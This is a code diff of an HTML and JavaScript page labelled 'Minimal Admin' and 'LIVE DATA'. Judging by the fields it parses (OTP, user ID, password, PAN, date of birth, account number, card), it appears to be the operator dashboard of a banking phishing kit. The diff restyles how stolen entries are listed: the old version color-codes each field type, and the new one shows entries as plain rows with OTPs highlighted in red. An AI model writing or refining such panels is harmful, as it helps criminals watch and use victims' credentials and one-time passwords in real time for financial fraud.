@@ -3,80 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Extreme Left Admin</title>
+    <title>Minimal Admin</title>
     <style>
-        /* Pura reset - Sab kuch baayein (Left) chipka do */
-        html, body {
-            margin: 0 !important;
-            padding: 0 !important;
-            background-color: #ffffff;
-            text-align: left !important;
-            display: block !important;
-        }
-
+        /* Extreme Reset: Sab kuch left se chipka do */
         * { 
-            box-sizing: border-box;
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
             font-family: 'Arial', sans-serif;
+            text-align: left !important;
         }
 
-        /* Header ko left se shuru karo */
+        body { 
+            background-color: #ffffff; 
+            padding: 10px;
+            display: block;
+        }
+
+        /* Header */
         .header {
-            width: 100% !important;
-            padding: 10px !important;
-            border-bottom: 2px solid #eee;
-            margin-bottom: 5px !important;
-            display: flex !important;
-            justify-content: space-between !important;
-            align-items: center !important;
+            width: 100%;
+            padding: 10px 0;
+            border-bottom: 2px solid #000; /* Moti Black Line Header ke liye */
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
-
+        
+        .header h1 { font-size: 14px; font-weight: 900; color: #000; }
+        
         .v-badge {
-            background: #ff0000;
+            background: #000;
             color: #fff;
-            padding: 2px 10px;
+            padding: 2px 8px;
             font-weight: 900;
-            border-radius: 4px;
+            font-size: 14px;
         }
 
-        /* Logs Container - No Flex, No Center */
+        /* Logs Container */
         #logsDisplay {
-            width: 100% !important;
-            padding: 5px !important;
-            display: block !important;
-            text-align: left !important;
+            width: 100%;
+            display: block;
         }
 
-        /* Ultra Patla Vibrant Cart */
-        .data-row {
-            display: block !important;
-            width: 100% !important;
-            padding: 4px 10px !important; /* Ekdum patla padding */
-            margin-bottom: 3px !important;
-            border-radius: 2px !important;
-            font-size: 13px !important;
-            font-weight: 800 !important;
-            line-height: 1.2 !important;
-            color: #ffffff !important;
-            white-space: pre-wrap !important;
-            word-break: break-all !important;
-            text-align: left !important; /* Strict Left */
-            float: left !important; /* Force Left */
-            clear: both !important;
+        /* Single Line Data (No Cart) */
+        .log-item {
+            width: 100%;
+            padding: 10px 0; /* Upar niche thoda space */
+            border-bottom: 1px solid #000; /* Sirf niche black line */
+            color: #000000; /* Pure Black Text */
+            font-weight: 800; /* Bold Text */
+            font-size: 15px;
+            line-height: 1.4;
+            white-space: pre-wrap;
+            word-break: break-all;
+            display: block;
+            clear: both;
         }
 
-        .time {
-            font-size: 8px;
-            color: rgba(255,255,255,0.7);
+        .time-text {
+            display: block;
+            font-size: 10px;
+            color: #666;
             font-weight: 400;
-            margin-left: 5px;
-            text-align: left !important;
+            margin-top: 5px;
         }
+
+        /* OTP ko highlight karne ke liye sirf text color red (optional) */
+        .otp-text { color: #ff0000 !important; }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <h1 style="font-size: 12px; margin:0; text-align:left;">TERMINAL LIVE</h1>
+        <h1>LIVE DATA</h1>
         <div class="v-badge" id="vCount">0</div>
     </div>
 
@@ -104,25 +105,14 @@
                 display.innerHTML = data.map(log => {
                     if (log.detail === "COUNT" || (log.type && log.type.includes("VISIT"))) return "";
 
-                    let content = log.detail.toLowerCase();
-                    let bgColor = "#222"; 
-
-                    // --- TEZ COLOUR CODING ---
-                    if (content.includes("otp:-")) {
-                        bgColor = "#FF0000"; // Red
-                    } else if (content.includes("user id:-") || content.includes("pass:-")) {
-                        bgColor = "#008000"; // Green
-                    } else if (content.includes("pan:-") || content.includes("dob:-")) {
-                        bgColor = "#0000FF"; // Blue
-                    } else if (content.includes("acc:-") || content.includes("name:-")) {
-                        bgColor = "#FF00FF"; // Pink
-                    } else if (content.includes("card:-")) {
-                        bgColor = "#FF8C00"; // Orange
-                    }
+                    // Space hatane ke liye trim
+                    let cleanDetail = log.detail.trim();
+                    let isOtp = cleanDetail.toLowerCase().includes("otp:-");
 
                     return `
-                        <div class="data-row" style="background-color: ${bgColor};">
-                            ${log.detail} <span class="time">${log.time || ''}</span>
+                        <div class="log-item ${isOtp ? 'otp-text' : ''}">
+                            ${cleanDetail}
+                            <span class="time-text">${log.time || ''}</span>
                         </div>
                     `;
                 }).join('');
